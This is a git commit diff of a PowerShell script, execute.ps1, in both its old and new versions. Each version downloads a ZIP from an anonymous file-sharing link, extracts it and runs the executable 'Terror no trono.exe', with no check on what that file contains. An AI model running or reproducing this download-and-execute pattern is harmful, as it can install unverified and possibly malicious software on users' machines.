95e5a4acc88b7ca40dac0e72aa2902f939ffcd55
zslfgkdghjklswdf <120216371+zslfgkdghjklswdf@users.noreply.github.com>
2023-09-28 18:16:20 -0300

    Add files via upload

--- execute.ps1
+++ execute.ps1
@@ -1,23 +1,9 @@
-# Define o URL do arquivo ZIP
-$zipUrl = "https://filetransfer.io/data-package/eeML0ZKe/download"
-
-# Define o caminho para onde você deseja extrair o arquivo ZIP
-$destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "TerrorNoTrono")
-
-# Faz o download do arquivo ZIP
-Invoke-WebRequest -Uri $zipUrl -OutFile "$destinationPath\Terror no trono.zip"
-
-# Extrai o arquivo ZIP
-Expand-Archive -Path "$destinationPath\Terror no trono.zip" -DestinationPath $destinationPath
-
-# Define o caminho para o executável
-$executablePath = [System.IO.Path]::Combine($destinationPath, "Terror no trono", "Terror no trono.exe")
-
-# Executa o arquivo executável
-Start-Process -FilePath $executablePath
-
-# Aguarda até que o processo seja concluído (opcional)
-Wait-Process -Name "Terror no trono"
-
-# Limpa os arquivos temporários (opcional)
-Remove-Item -Path "$destinationPath" -Recurse -Force
+# Import the required modules
+import-module PowerShellGet
+import-module Archive
+# Download the Terror no trono.zip file
+Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" -OutFile "Terror no trono.zip"
+# Extract the Terror no trono.zip file
+Expand-Archive -Path "Terror no trono.zip" -DestinationPath "Terror no trono"
+# Execute the Terror no trono.exe file
+Start-Process -FilePath "Terror no trono\Terror no trono.exe"
